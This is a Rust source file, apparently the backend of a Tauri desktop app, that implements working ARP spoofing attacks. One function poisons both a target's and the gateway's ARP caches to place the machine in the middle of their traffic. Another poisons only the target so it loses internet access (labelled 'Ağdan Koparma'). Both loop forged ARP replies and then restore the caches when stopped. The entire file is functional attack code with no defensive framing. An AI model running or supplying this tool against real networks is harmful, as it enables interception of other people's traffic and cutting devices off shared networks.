use pnet::datalink::{self, Channel::Ethernet};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::Packet;
use pnet::util::MacAddr;
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tauri::{AppHandle, Emitter};

// --- Shared Stop Flags ---
static MITM_STOP: std::sync::OnceLock<Arc<AtomicBool>> = std::sync::OnceLock::new();
static ISOLATE_STOP: std::sync::OnceLock<Arc<AtomicBool>> = std::sync::OnceLock::new();

fn get_mitm_stop() -> Arc<AtomicBool> {
    MITM_STOP.get_or_init(|| Arc::new(AtomicBool::new(false))).clone()
}
fn get_isolate_stop() -> Arc<AtomicBool> {
    ISOLATE_STOP.get_or_init(|| Arc::new(AtomicBool::new(false))).clone()
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct MitmStatus {
    pub active: bool,
    pub target_ip: String,
    pub packets_intercepted: u64,
    pub mode: String, // "intercept" | "isolate"
}

pub fn stop_mitm() {
    get_mitm_stop().store(true, Ordering::Relaxed);
}

pub fn stop_isolate() {
    get_isolate_stop().store(true, Ordering::Relaxed);
}

// ─────────────────────────────────────────────────
// ARP SPOOFING (MitM — traffic intercept mode)
// ─────────────────────────────────────────────────
pub async fn start_mitm(
    app: AppHandle,
    target_ip: String,
    gateway_ip: String,
    our_mac: String,
    interface_name: String,
) {
    let stop_flag = get_mitm_stop();
    stop_flag.store(false, Ordering::Relaxed);

    let target_ip_addr = match Ipv4Addr::from_str(&target_ip) { Ok(a) => a, Err(_) => return };
    let gateway_ip_addr = match Ipv4Addr::from_str(&gateway_ip) { Ok(a) => a, Err(_) => return };

    let interfaces = datalink::interfaces();
    let interface = match interfaces.into_iter().find(|i| i.name == interface_name || i.description == interface_name) {
        Some(i) => i, None => return,
    };

    let our_mac_addr = match parse_mac(&our_mac) { Some(m) => m, None => return };
    let target_mac = get_arp_mac(&target_ip).await.unwrap_or(MacAddr::broadcast());
    let gateway_mac = get_arp_mac(&gateway_ip).await.unwrap_or(MacAddr::broadcast());

    let (mut sender, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx), _ => return,
    };

    let _ = app.emit("mitm-started", MitmStatus {
        active: true, target_ip: target_ip.clone(), packets_intercepted: 0, mode: "intercept".to_string()
    });

    let app_clone = app.clone();
    let stop = stop_flag.clone();
    let target = target_ip.clone();

    tokio::spawn(async move {
        let mut count = 0u64;
        while !stop.load(Ordering::Relaxed) {
            // Poison target: "I am the gateway"
            if let Some(p) = build_arp_reply(our_mac_addr, gateway_ip_addr, target_mac, target_ip_addr) { let _ = sender.send_to(&p, None); }
            // Poison gateway: "I am the target"
            if let Some(p) = build_arp_reply(our_mac_addr, target_ip_addr, gateway_mac, gateway_ip_addr) { let _ = sender.send_to(&p, None); }
            count += 2;
            let _ = app_clone.emit("mitm-status", MitmStatus {
                active: true, target_ip: target.clone(), packets_intercepted: count, mode: "intercept".to_string()
            });
            tokio::time::sleep(Duration::from_secs(2)).await;
        }
        // Restore ARP caches
        for _ in 0..5 {
            if let Some(p) = build_arp_reply(gateway_mac, gateway_ip_addr, target_mac, target_ip_addr) { let _ = sender.send_to(&p, None); }
            if let Some(p) = build_arp_reply(target_mac, target_ip_addr, gateway_mac, gateway_ip_addr) { let _ = sender.send_to(&p, None); }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        let _ = app_clone.emit("mitm-stopped", ());
    });
}

// ─────────────────────────────────────────────────
// ARP ISOLATION (Ağdan Koparma — no forwarding)
// ─────────────────────────────────────────────────
/// Isolates a device from the internet by poisoning only its ARP cache.
/// It believes we are the gateway but we never forward its packets → no internet.
/// Restoration sends the real gateway MAC back when stopped.
pub async fn isolate_device(
    app: AppHandle,
    target_ip: String,
    gateway_ip: String,
    our_mac: String,
    interface_name: String,
) {
    let stop_flag = get_isolate_stop();
    stop_flag.store(false, Ordering::Relaxed);

    let target_ip_addr = match Ipv4Addr::from_str(&target_ip) { Ok(a) => a, Err(_) => return };
    let gateway_ip_addr = match Ipv4Addr::from_str(&gateway_ip) { Ok(a) => a, Err(_) => return };

    let interfaces = datalink::interfaces();
    let interface = match interfaces.into_iter().find(|i| i.name == interface_name || i.description == interface_name) {
        Some(i) => i, None => return,
    };

    let our_mac_addr = match parse_mac(&our_mac) { Some(m) => m, None => return };
    let target_mac = get_arp_mac(&target_ip).await.unwrap_or(MacAddr::broadcast());
    // Get the real gateway MAC for restoration later
    let gateway_mac = get_arp_mac(&gateway_ip).await.unwrap_or(MacAddr::broadcast());

    let (mut sender, _) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx), _ => return,
    };

    let _ = app.emit("mitm-started", MitmStatus {
        active: true, target_ip: target_ip.clone(), packets_intercepted: 0, mode: "isolate".to_string()
    });

    let app_clone = app.clone();
    let stop = stop_flag.clone();
    let target = target_ip.clone();

    tokio::spawn(async move {
        let mut count = 0u64;
        while !stop.load(Ordering::Relaxed) {
            // Only poison the TARGET's ARP cache — tell it "I am the gateway"
            // We do NOT poison the gateway, so gateway's traffic is not disrupted
            // We also do NOT forward packets → target loses internet
            if let Some(p) = build_arp_reply(our_mac_addr, gateway_ip_addr, target_mac, target_ip_addr) {
                let _ = sender.send_to(&p, None);
            }
            count += 1;
            let _ = app_clone.emit("mitm-status", MitmStatus {
                active: true, target_ip: target.clone(), packets_intercepted: count, mode: "isolate".to_string()
            });
            // Send more frequently for stronger isolation
            tokio::time::sleep(Duration::from_millis(800)).await;
        }

        // RESTORE: send the real gateway MAC back to the target
        for _ in 0..8 {
            if let Some(p) = build_arp_reply(gateway_mac, gateway_ip_addr, target_mac, target_ip_addr) {
                let _ = sender.send_to(&p, None);
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        let _ = app_clone.emit("isolate-stopped", target.clone());
        let _ = app_clone.emit("mitm-stopped", ());
    });
}

// ─────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────
fn build_arp_reply(
    sender_mac: MacAddr, sender_ip: Ipv4Addr,
    target_mac: MacAddr, target_ip: Ipv4Addr,
) -> Option<Vec<u8>> {
    let mut eth_buf = vec![0u8; 42];
    let mut eth_pkt = MutableEthernetPacket::new(&mut eth_buf)?;
    eth_pkt.set_destination(target_mac);
    eth_pkt.set_source(sender_mac);
    eth_pkt.set_ethertype(EtherTypes::Arp);

    let mut arp_buf = vec![0u8; 28];
    let mut arp_pkt = MutableArpPacket::new(&mut arp_buf)?;
    arp_pkt.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_pkt.set_protocol_type(EtherTypes::Ipv4);
    arp_pkt.set_hw_addr_len(6);
    arp_pkt.set_proto_addr_len(4);
    arp_pkt.set_operation(ArpOperations::Reply);
    arp_pkt.set_sender_hw_addr(sender_mac);
    arp_pkt.set_sender_proto_addr(sender_ip);
    arp_pkt.set_target_hw_addr(target_mac);
    arp_pkt.set_target_proto_addr(target_ip);

    eth_pkt.set_payload(arp_pkt.packet());
    Some(eth_pkt.packet().to_vec())
}

pub fn parse_mac(mac: &str) -> Option<MacAddr> {
    let parts: Vec<u8> = mac.split(':')
        .filter_map(|s| u8::from_str_radix(s, 16).ok())
        .collect();
    if parts.len() == 6 {
        Some(MacAddr::new(parts[0], parts[1], parts[2], parts[3], parts[4], parts[5]))
    } else { None }
}

async fn get_arp_mac(ip: &str) -> Option<MacAddr> {
    use std::process::Command;
    let _ = tokio::process::Command::new("ping").args(["-n", "1", "-w", "300", ip]).output().await;
    let out = Command::new("arp").arg("-a").output().ok()?;
    let text = String::from_utf8_lossy(&out.stdout).to_string();
    for line in text.lines() {
        if line.contains(ip) {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                return parse_mac(&parts[1].replace('-', ":"));
            }
        }
    }
    None
}

pub fn get_our_mac(interface_name: &str) -> String {
    let interfaces = datalink::interfaces();
    for iface in interfaces {
        if iface.name == interface_name || iface.description == interface_name {
            if let Some(mac) = iface.mac { return mac.to_string(); }
        }
    }
    "00:00:00:00:00:00".to_string()
}
